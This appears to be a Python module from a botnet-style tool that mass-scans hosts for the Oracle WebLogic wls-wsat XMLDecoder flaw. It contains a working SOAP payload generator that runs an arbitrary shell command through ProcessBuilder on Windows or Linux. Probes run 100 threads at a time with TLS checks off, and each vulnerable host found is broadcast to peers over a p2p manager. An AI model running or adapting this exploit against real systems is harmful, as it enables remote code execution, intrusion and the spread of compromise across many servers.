class WebLogicTargetVerifier:
    def __init__(self, configmanager, p2pmanager=None, logger=None):
        import logging, requests, threading
        self.configmanager = configmanager
        self.p2pmanager = p2pmanager
        self.logger = logger or logging.getLogger("Internal.System.Core.weblogic_verifier")
        self.lock = threading.Lock()
        self.verified_targets = {}
        self.session = requests.Session()
        self.session.verify = False
        self.endpoints = [
            "/wls-wsat/CoordinatorPortType",
            "/wls-wsat/CoordinatorPortType11",
            "/wls-wsat/ParticipantPortType",
            "/wls-wsat/ParticipantPortType11",
            "/wls-wsat/RegistrationPortTypeRPC",
            "/wls-wsat/RegistrationPortTypeRPC11",
            "/wls-wsat/RegistrationRequesterPortType",
            "/wls-wsat/RegistrationRequesterPortType11",
        ]

    def scan_weblogic_targets(self, targets, max_workers=100):
        from concurrent.futures import ThreadPoolExecutor, as_completed
        verified = []
        def check_target(target):
            ip = target['ip']
            port = target.get('port', 7001)
            if self.verify_weblogic_vuln(ip, port):
                with self.lock:
                    verified.append({'ip': ip, 'port': port})

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(check_target, t): t for t in targets}
            for future in as_completed(futures):
                try:
                    future.result()
                except: pass
        return verified

    def _get_os_type(self, base_url):
        try:
            r = self.session.get(base_url, timeout=3)
            server = r.headers.get("Server", "").lower()
            if "windows" in server:
                return "windows"
        except: pass
        return "linux"

    def _generate_xml(self, cmd, shell="/bin/sh", shell_arg="-c"):
        # Escape XML entities for safety in the command
        cmd_escaped = cmd.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;").replace("'", "&apos;")
        return f"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/08/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0">
              <string>{shell}</string>
            </void>
            <void index="1">
              <string>{shell_arg}</string>
            </void>
            <void index="2">
              <string>{cmd_escaped}</string>
            </void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>"""

    @safe_operation("weblogic_verify")
    def verify_weblogic_vuln(self, target_ip, target_port=7001):
        import hashlib, time, requests
        cache_key = hashlib.md5(f"{target_ip}:{target_port}".encode()).hexdigest()
        with self.lock:
            if cache_key in self.verified_targets:
                return True

        base_url = f"http://{target_ip}:{target_port}"
        
        os_type = self._get_os_type(base_url)
        if os_type == "windows":
            shell = "cmd.exe"
            shell_arg = "/c"
        else:
            shell = "/bin/sh"
            shell_arg = "-c"
            
        cmd = "echo ds_weblogic_verify"
        payload = self._generate_xml(cmd, shell, shell_arg)

        for attempt in range(3):
            for endpoint in self.endpoints:
                check_url = f"{base_url}{endpoint}"
                try:
                    res = self.session.post(
                        check_url,
                        data=payload.encode("utf-8"),
                        headers={'Connection': 'close', 'Content-Type': 'text/xml'},
                        timeout=5
                    )
                    
                    if "ds_weblogic_verify" in res.text or res.status_code == 500:
                        with self.lock:
                            self.verified_targets[cache_key] = True
                            
                        if self.p2pmanager:
                            self.p2pmanager.broadcast_message({
                                'type': 'weblogic_vuln_found',
                                'ip': target_ip,
                                'port': target_port,
                                'timestamp': time.time()
                            })
                        return True
                except requests.exceptions.Timeout:
                    print(f"Timeout connecting to {target_ip}:{target_port}{endpoint}")
                except requests.exceptions.ConnectionError:
                    print(f"Connection error to {target_ip}:{target_port}{endpoint}")
                except Exception as e:
                    print(f"Unexpected error: {e}")
            
            time.sleep(2 ** attempt)
        return False


